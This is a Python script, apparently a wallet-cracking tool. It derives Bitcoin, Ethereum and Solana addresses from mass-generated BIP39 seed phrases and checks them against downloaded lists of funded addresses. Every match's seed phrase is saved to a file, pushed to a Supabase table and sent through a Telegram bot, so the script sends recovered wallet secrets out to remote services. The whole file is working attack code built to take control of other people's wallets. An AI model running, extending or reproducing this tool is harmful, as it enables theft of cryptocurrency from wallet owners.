#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import io
import json
import time
import signal
import sqlite3
import subprocess
import logging
import threading
import contextlib
import urllib.request
import urllib.parse
import multiprocessing as mp
from concurrent.futures import ProcessPoolExecutor, as_completed
import gdown
from mnemonic import Mnemonic
from bip_utils import (
    Bip39SeedGenerator,
    Bip32Slip10Ed25519,
    Bip44,
    Bip44Coins,
    Bip44Changes,
    Bip49,
    Bip49Coins,
    Bip84,
    Bip84Coins,
    Bip44Conf,
)
from supabase import create_client

Bip44Conf.ENABLE_UNSAFE_HDWALLET = True

# ----------------------------------------------------------------------
# Config
# ----------------------------------------------------------------------
BTC_FILE_ID = "1rysnhDGWd6OxtqbjHy-UEiDt6VDBsbAI"
ETH_FILE_ID = "1G9CCyNnDoTxvQhqdQxYkbPG-HV2WN-Fx"
SOL_FILE_ID = "1_ILIimHqOzws0Ld3IteMcH1_Rww9a-Ic"

BTC_TXT = "btc_addresses.txt"
ETH_TXT = "eth_addresses.txt"
SOL_TXT = "sol_addresses.txt"

BTC_DB = "btc_addresses.db"
ETH_DB = "eth_addresses.db"
SOL_DB = "sol_addresses.db"

VALID_SEEDS_FILE = "valid_seeds.txt"
FOUND_FILE = "found_matches.txt"

GENERATOR_SCRIPT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "generator.py")

ATOMIC_ID = 1
TELEGRAM_MESSAGE_LIMIT = 4000
NUM_WORKERS = 50
LOOKUP_LOG_EVERY = 5_000_000
STOP_CHECK_MASK = 0xFFF
PROGRESS_FLUSH_EVERY = 50_000
MONITOR_INTERVAL = 30
DERIVE_LOG_EVERY = 2_000_000

SOL_DERIVATION_PATH = "m/44'/501'/0'/0'"

SEEDS = []
_STOP_EVENT = None
_PHASE_COUNTER = None
_PHASE_LOCK = None

_telegram_bot_id = None
_telegram_chat_id = None


class NullHandler(logging.Handler):
    def emit(self, record):
        pass

logger = logging.getLogger("wallet_scanner")
logger.handlers = []
logger.addHandler(NullHandler())
logger.propagate = False
logger.setLevel(logging.CRITICAL)

logging.getLogger("aiohttp").setLevel(logging.CRITICAL)
logging.getLogger("asyncio").setLevel(logging.CRITICAL)


# ----------------------------------------------------------------------
# DB / Supabase
# ----------------------------------------------------------------------
def load_db_config():
    here = os.path.dirname(os.path.abspath(__file__))
    for path in (
        os.path.join(here, "db.txt"),
        os.path.join(os.path.dirname(here), "db.txt"),
        os.path.join(os.path.dirname(os.path.dirname(here)), "db.txt"),
    ):
        if os.path.exists(path):
            cfg = {}
            with open(path) as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    if "=" in line:
                        k, _, v = line.partition("=")
                        cfg[k.strip()] = v.strip().strip('"')
            return cfg
    raise FileNotFoundError("db.txt not found")


def get_supabase():
    cfg = load_db_config()
    return create_client(cfg["SUPABASE_URL"], cfg["SUPABASE_KEY"])


def get_atomic_row():
    supabase = get_supabase()
    res = supabase.table("atomic").select("*").eq("id", ATOMIC_ID).limit(1).execute()
    return res.data[0] if res.data else None


def update_atomic(fields):
    supabase = get_supabase()
    supabase.table("atomic").update(fields).eq("id", ATOMIC_ID).execute()


def set_progress_flag(value):
    try:
        update_atomic({"progress": value})
        print(f"progress = {value}")
    except Exception as e:
        print(f"WARN: set progress: {e}")


def append_found_record(record):
    last_err = None
    for attempt in range(1, 6):
        try:
            row = get_atomic_row()
            current = []
            if row and row.get("found"):
                current = row["found"]
                if not isinstance(current, list):
                    current = []
            current.append(record)
            update_atomic({"found": current})
            return True
        except Exception as e:
            last_err = e
            wait = min(2 ** attempt, 30)
            print(f"WARN: append_found {attempt}/5: {e}")
            if attempt < 5:
                time.sleep(wait)
    print(f"WARN: append_found gave up: {last_err}")
    return False


# ----------------------------------------------------------------------
# Telegram
# ----------------------------------------------------------------------
def load_telegram_config():
    global _telegram_bot_id, _telegram_chat_id
    try:
        row = get_atomic_row()
        if row and row.get("telegram"):
            cfg = row["telegram"]
            if isinstance(cfg, dict):
                _telegram_bot_id = cfg.get("bot_id")
                _telegram_chat_id = cfg.get("chat_id")
        if _telegram_bot_id and _telegram_chat_id:
            print(f"telegram on (chat={_telegram_chat_id})")
        else:
            print("telegram off")
    except Exception as e:
        print(f"WARN: telegram config: {e}")


def _telegram_post(url, payload, timeout=15):
    data = urllib.parse.urlencode(payload).encode("utf-8")
    req = urllib.request.Request(url, data=data, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status == 200
    except Exception as e:
        print(f"telegram error: {e}")
        return False


def send_telegram_alert(coin, seed, address, extra=None):
    if not _telegram_bot_id or not _telegram_chat_id:
        return False

    lines = [
        f"<b>MATCH FOUND [{coin}]</b>",
        f"<b>Seed:</b> <code>{seed}</code>",
        f"<b>Address:</b> <code>{address}</code>",
    ]
    if extra:
        lines.append(f"<b>Info:</b> <code>{extra}</code>")
    text = "\n".join(lines)

    if len(text) > TELEGRAM_MESSAGE_LIMIT:
        text = text[:TELEGRAM_MESSAGE_LIMIT - 3] + "..."

    url = f"https://api.telegram.org/bot{_telegram_bot_id}/sendMessage"
    payload = {
        "chat_id": _telegram_chat_id,
        "text": text,
        "parse_mode": "HTML",
        "disable_web_page_preview": True,
    }
    ok = _telegram_post(url, payload)
    if ok:
        print(f"telegram sent [{coin}] {address}")
    return ok


# ----------------------------------------------------------------------
# Downloads
# ----------------------------------------------------------------------
def download_public_drive_file(file_id, local_path, label):
    if os.path.exists(local_path) and os.path.getsize(local_path) > 0:
        size_mb = os.path.getsize(local_path) / (1024 * 1024)
        print(f"{label}: {size_mb:.0f} MB (cached)")
        return local_path

    try:
        buf = io.StringIO()
        with contextlib.redirect_stdout(buf), contextlib.redirect_stderr(buf):
            gdown.download(id=file_id, output=local_path, quiet=True)
    except Exception as e:
        print(f"ERROR downloading {label}: {e}")
        return None

    if not os.path.exists(local_path) or os.path.getsize(local_path) == 0:
        print(f"ERROR: {label} not public or empty")
        return None

    size_mb = os.path.getsize(local_path) / (1024 * 1024)
    print(f"{label}: {size_mb:.0f} MB")
    return local_path


# ----------------------------------------------------------------------
# SQLite
# ----------------------------------------------------------------------
def build_sqlite_from_txt(txt_path, db_path, label):
    if os.path.exists(db_path) and os.path.getsize(db_path) > 0:
        conn = sqlite3.connect(db_path)
        try:
            count = conn.execute("SELECT COUNT(*) FROM addresses").fetchone()[0]
        except Exception:
            count = 0
        conn.close()
        if count > 0:
            print(f"{label} index: {count:,} (cached)")
            return
    if os.path.exists(db_path):
        os.remove(db_path)
    conn = sqlite3.connect(db_path)
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA synchronous=OFF")
    conn.execute("PRAGMA cache_size=-2000000")
    conn.execute("CREATE TABLE addresses (address TEXT PRIMARY KEY)")
    conn.execute("CREATE INDEX IF NOT EXISTS idx_address ON addresses(address)")

    t0 = time.time()
    batch = []
    total = 0
    with open(txt_path, "r", encoding="utf-8") as f:
        for line in f:
            addr = line.strip()
            if addr:
                batch.append((addr,))
                if len(batch) >= 100000:
                    conn.executemany("INSERT OR IGNORE INTO addresses VALUES (?)", batch)
                    conn.commit()
                    total += len(batch)
                    batch.clear()
    if batch:
        conn.executemany("INSERT OR IGNORE INTO addresses VALUES (?)", batch)
        conn.commit()
        total += len(batch)
    conn.close()
    print(f"{label} index: {total:,} ({time.time()-t0:.0f}s)")


class AddressChecker:
    def __init__(self, db_path):
        self.conn = sqlite3.connect(db_path)
        self.conn.execute("PRAGMA query_only = ON")
        self.conn.execute("PRAGMA cache_size=-1000000")
        self._cur = self.conn.cursor()

    def contains(self, address):
        if not address:
            return False
        self._cur.execute(
            "SELECT 1 FROM addresses WHERE address = ? LIMIT 1", (address,)
        )
        return self._cur.fetchone() is not None

    def close(self):
        try:
            self.conn.close()
        except Exception:
            pass


# ----------------------------------------------------------------------
# Matches
# ----------------------------------------------------------------------
def log_match(coin, seed, address, extra=None):
    record = {
        "coin": coin,
        "seed": seed,
        "address": address,
        "timestamp": time.time(),
    }
    if extra:
        record["extra"] = extra

    try:
        with open(FOUND_FILE, "a", encoding="utf-8") as f:
            f.write(json.dumps(record, separators=(",", ":")) + "\n")
    except Exception as e:
        print(f"WARN: local found file: {e}")

    append_found_record(record)
    send_telegram_alert(coin, seed, address, extra=extra)
    print(f"MATCH [{coin}] {address} <- {seed}")


# ----------------------------------------------------------------------
# Derivation
# ----------------------------------------------------------------------
def derive_btc_addresses(seed_bytes):
    """
    BIP44 m/44'/0'/0'/0/0  -> P2PKH  (1...)
    BIP49 m/49'/0'/0'/0/0  -> P2SH   (3...)
    BIP84 m/84'/0'/0'/0/0  -> bech32 (bc1...)
    """
    results = []

    try:
        addr = Bip44.FromSeed(seed_bytes, Bip44Coins.BITCOIN) \
            .Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT) \
            .AddressIndex(0).PublicKey().ToAddress()
        results.append(("p2pkh", addr))
    except Exception:
        pass

    try:
        addr = Bip49.FromSeed(seed_bytes, Bip49Coins.BITCOIN) \
            .Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT) \
            .AddressIndex(0).PublicKey().ToAddress()
        results.append(("p2sh", addr))
    except Exception:
        pass

    try:
        addr = Bip84.FromSeed(seed_bytes, Bip84Coins.BITCOIN) \
            .Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT) \
            .AddressIndex(0).PublicKey().ToAddress()
        results.append(("bech32", addr))
    except Exception:
        pass

    return results


def derive_eth_address(seed_bytes):
    """
    BIP44 m/44'/60'/0'/0/0 -> Ethereum address (0x...)
    """
    try:
        return Bip44.FromSeed(seed_bytes, Bip44Coins.ETHEREUM) \
            .Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT) \
            .AddressIndex(0).PublicKey().ToAddress()
    except Exception:
        return None


def derive_sol_address(seed_bytes):
    """
    Solana ed25519 (SLIP-0010) at standard wallet path:
        m/44'/501'/0'/0'
    All levels hardened. Uses Bip32Slip10Ed25519 (not Bip44Coins.SOLANA).
    """
    try:
        ctx = Bip32Slip10Ed25519.FromSeed(seed_bytes)
        derived = ctx.DerivePath(SOL_DERIVATION_PATH)
        return derived.PublicKey().ToAddress()
    except Exception:
        return None


# ----------------------------------------------------------------------
# Workers (read SEEDS / _STOP_EVENT / _PHASE_COUNTER as module globals
# inherited via fork — no Manager proxies in args)
# ----------------------------------------------------------------------
def _bump_progress(n):
    with _PHASE_LOCK:
        prev = _PHASE_COUNTER.value
        new = prev + n
        _PHASE_COUNTER.value = new
        prev_level = prev // DERIVE_LOG_EVERY
        new_level = new // DERIVE_LOG_EVERY
        log_now = new_level > prev_level
    return log_now, new


def derive_worker_btc(args):
    worker_id, start_idx, count = args
    path = f"temp_btc_w{worker_id:02d}.txt"
    written = 0
    since_flush = 0

    with open(path, "w", encoding="utf-8") as f:
        for offset in range(count):
            if (offset & STOP_CHECK_MASK) == 0 and _STOP_EVENT.is_set():
                break
            seed = SEEDS[start_idx + offset]
            try:
                seed_bytes = Bip39SeedGenerator(seed).Generate()
            except Exception:
                since_flush += 1
                continue
            for _typ, addr in derive_btc_addresses(seed_bytes):
                f.write(f"{addr}\t{seed}\n")
                written += 1

            since_flush += 1
            if since_flush >= PROGRESS_FLUSH_EVERY:
                _bump_progress(since_flush)
                since_flush = 0

        if since_flush:
            _bump_progress(since_flush)

    return path, written


def derive_worker_eth(args):
    worker_id, start_idx, count = args
    path = f"temp_eth_w{worker_id:02d}.txt"
    written = 0
    since_flush = 0

    with open(path, "w", encoding="utf-8") as f:
        for offset in range(count):
            if (offset & STOP_CHECK_MASK) == 0 and _STOP_EVENT.is_set():
                break
            seed = SEEDS[start_idx + offset]
            try:
                seed_bytes = Bip39SeedGenerator(seed).Generate()
            except Exception:
                since_flush += 1
                continue
            addr = derive_eth_address(seed_bytes)
            if addr:
                f.write(f"{addr}\t{seed}\n")
                written += 1

            since_flush += 1
            if since_flush >= PROGRESS_FLUSH_EVERY:
                _bump_progress(since_flush)
                since_flush = 0

        if since_flush:
            _bump_progress(since_flush)

    return path, written


def derive_worker_sol(args):
    worker_id, start_idx, count = args
    path = f"temp_sol_w{worker_id:02d}.txt"
    written = 0
    since_flush = 0

    with open(path, "w", encoding="utf-8") as f:
        for offset in range(count):
            if (offset & STOP_CHECK_MASK) == 0 and _STOP_EVENT.is_set():
                break
            seed = SEEDS[start_idx + offset]
            try:
                seed_bytes = Bip39SeedGenerator(seed).Generate()
            except Exception:
                since_flush += 1
                continue
            addr = derive_sol_address(seed_bytes)
            if addr:
                f.write(f"{addr}\t{seed}\n")
                written += 1

            since_flush += 1
            if since_flush >= PROGRESS_FLUSH_EVERY:
                _bump_progress(since_flush)
                since_flush = 0

        if since_flush:
            _bump_progress(since_flush)

    return path, written


# ----------------------------------------------------------------------
# Phase runner
# ----------------------------------------------------------------------
def run_derivation_phase(worker_fn, seeds, stop_event, coin):
    global _STOP_EVENT, _PHASE_COUNTER, _PHASE_LOCK
    _STOP_EVENT = stop_event
    _PHASE_COUNTER = mp.Value("q", 0)
    _PHASE_LOCK = mp.Lock()

    total = len(seeds)
    chunk = total // NUM_WORKERS
    remainder = total % NUM_WORKERS

    tasks = []
    start = 0
    for w in range(NUM_WORKERS):
        count = chunk + (1 if w < remainder else 0)
        if count == 0:
            continue
        tasks.append((w, start, count))
        start += count

    print(f"{coin} derive: launching {len(tasks)} workers over {total:,} seeds", flush=True)

    produced = []
    total_written = 0
    t0 = time.time()

    monitor_stop = threading.Event()

    def monitor():
        last_total = 0
        last_time = time.time()
        while not monitor_stop.wait(MONITOR_INTERVAL):
            cur = _PHASE_COUNTER.value
            now = time.time()
            dt = now - last_time
            inst_rate = (cur - last_total) / dt if dt > 0 else 0
            avg_rate = cur / (now - t0) if now > t0 else 0
            pct = 100.0 * cur / total if total else 0
            print(
                f"  {coin}: {cur:,}/{total:,} ({pct:.1f}%) "
                f"rate={inst_rate:,.0f}/s avg={avg_rate:,.0f}/s",
                flush=True,
            )
            last_total = cur
            last_time = now

    monitor_thread = threading.Thread(target=monitor, daemon=True)
    monitor_thread.start()

    try:
        ctx = mp.get_context("fork")
        with ProcessPoolExecutor(max_workers=NUM_WORKERS, mp_context=ctx) as executor:
            futures = [executor.submit(worker_fn, t) for t in tasks]
            try:
                for fut in as_completed(futures):
                    try:
                        path, written = fut.result()
                        produced.append(path)
                        total_written += written
                    except Exception as e:
                        print(f"{coin} worker error: {e}", flush=True)
            except KeyboardInterrupt:
                stop_event.set()
                for fut in futures:
                    try:
                        fut.result(timeout=10)
                    except Exception:
                        pass
    finally:
        monitor_stop.set()

    elapsed = time.time() - t0
    rate = total_written / elapsed if elapsed else 0
    print(
        f"{coin} derived: {total_written:,} addresses in {elapsed:.0f}s ({rate:,.0f}/s)",
        flush=True,
    )

    return produced


def cleanup_temp_file(path):
    try:
        if os.path.exists(path):
            os.remove(path)
    except OSError as e:
        print(f"WARN: delete {path}: {e}")


def lookup_addresses(temp_files, db_path, coin):
    if not temp_files:
        print(f"{coin} lookup: no temp files")
        return 0

    checker = AddressChecker(db_path)
    total_lines = 0
    matches = 0
    last_log = 0
    t0 = time.time()

    try:
        for path in temp_files:
            if not os.path.exists(path):
                continue
            with open(path, "r", encoding="utf-8") as f:
                for line in f:
                    line = line.rstrip("\n")
                    if not line:
                        continue
                    addr, _, seed = line.partition("\t")
                    total_lines += 1

                    if checker.contains(addr):
                        log_match(coin, seed, addr)
                        matches += 1

                    if total_lines - last_log >= LOOKUP_LOG_EVERY:
                        rate = total_lines / (time.time() - t0)
                        print(f"  {coin}: {total_lines:,} ({rate:,.0f}/s, {matches} hits)", flush=True)
                        last_log = total_lines

            cleanup_temp_file(path)
    finally:
        checker.close()

    elapsed = time.time() - t0
    rate = total_lines / elapsed if elapsed else 0
    print(
        f"{coin} lookup: {total_lines:,} in {elapsed:.0f}s ({rate:,.0f}/s), {matches} hits",
        flush=True,
    )
    return matches


# ----------------------------------------------------------------------
# Phases
# ----------------------------------------------------------------------
def process_btc(seeds, stop_event):
    print("=== BTC phase ===", flush=True)
    files = run_derivation_phase(derive_worker_btc, seeds, stop_event, "BTC")
    matches = lookup_addresses(files, BTC_DB, "BTC")
    print("=== BTC phase done ===", flush=True)
    return matches


def process_eth(seeds, stop_event):
    print("=== ETH phase ===", flush=True)
    files = run_derivation_phase(derive_worker_eth, seeds, stop_event, "ETH")
    matches = lookup_addresses(files, ETH_DB, "ETH")
    print("=== ETH phase done ===", flush=True)
    return matches


def process_sol(seeds, stop_event):
    print("=== SOL phase ===", flush=True)
    files = run_derivation_phase(derive_worker_sol, seeds, stop_event, "SOL")
    matches = lookup_addresses(files, SOL_DB, "SOL")
    print("=== SOL phase done ===", flush=True)
    return matches


# ----------------------------------------------------------------------
# Round orchestration
# ----------------------------------------------------------------------
def ensure_valid_seeds():
    if os.path.exists(VALID_SEEDS_FILE) and os.path.getsize(VALID_SEEDS_FILE) > 0:
        return True
    print(f"{VALID_SEEDS_FILE} missing, running generator", flush=True)
    try:
        result = subprocess.run([sys.executable, GENERATOR_SCRIPT], check=False)
        if result.returncode != 0:
            print(f"generator exit: {result.returncode}")
            return False
    except Exception as e:
        print(f"generator failed: {e}")
        return False
    return os.path.exists(VALID_SEEDS_FILE) and os.path.getsize(VALID_SEEDS_FILE) > 0


def call_generator_for_next_round():
    print("calling generator", flush=True)
    try:
        result = subprocess.run([sys.executable, GENERATOR_SCRIPT], check=False)
        if result.returncode != 0:
            print(f"generator exit: {result.returncode}")
            return False
    except Exception as e:
        print(f"generator failed: {e}")
        return False
    return True


def finalize_round():
    if os.path.exists(VALID_SEEDS_FILE):
        try:
            os.remove(VALID_SEEDS_FILE)
            print(f"deleted {VALID_SEEDS_FILE}")
        except OSError as e:
            print(f"WARN: delete {VALID_SEEDS_FILE}: {e}")

    set_progress_flag(True)
    call_generator_for_next_round()


# ----------------------------------------------------------------------
# Main
# ----------------------------------------------------------------------
def main():
    global SEEDS

    row = get_atomic_row()
    if row is None:
        print("ERROR: atomic row id=1 missing")
        sys.exit(1)

    load_telegram_config()

    if not ensure_valid_seeds():
        print("ERROR: no valid_seeds.txt")
        sys.exit(1)

    if not download_public_drive_file(BTC_FILE_ID, BTC_TXT, "btc"):
        sys.exit(1)
    if not download_public_drive_file(ETH_FILE_ID, ETH_TXT, "eth"):
        sys.exit(1)
    if not download_public_drive_file(SOL_FILE_ID, SOL_TXT, "sol"):
        sys.exit(1)

    build_sqlite_from_txt(BTC_TXT, BTC_DB, "btc")
    build_sqlite_from_txt(ETH_TXT, ETH_DB, "eth")
    build_sqlite_from_txt(SOL_TXT, SOL_DB, "sol")

    with open(VALID_SEEDS_FILE, "r", encoding="utf-8") as f:
        SEEDS = [line.strip() for line in f if line.strip()]

    if not SEEDS:
        print("ERROR: no seeds")
        sys.exit(1)

    print(f"loaded {len(SEEDS):,} seeds; {NUM_WORKERS} workers per phase", flush=True)

    stop_event = mp.Event()

    def _signal_handler(sig, frame):
        print("interrupt", flush=True)
        stop_event.set()

    signal.signal(signal.SIGINT, _signal_handler)

    total_matches = 0

    try:
        total_matches += process_btc(SEEDS, stop_event)
        if stop_event.is_set():
            print("stopped after BTC")
            sys.exit(1)

        total_matches += process_eth(SEEDS, stop_event)
        if stop_event.is_set():
            print("stopped after ETH")
            sys.exit(1)

        total_matches += process_sol(SEEDS, stop_event)
    except KeyboardInterrupt:
        print("interrupted")
        sys.exit(1)

    finalize_round()
    print(f"total matches: {total_matches}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("shutdown")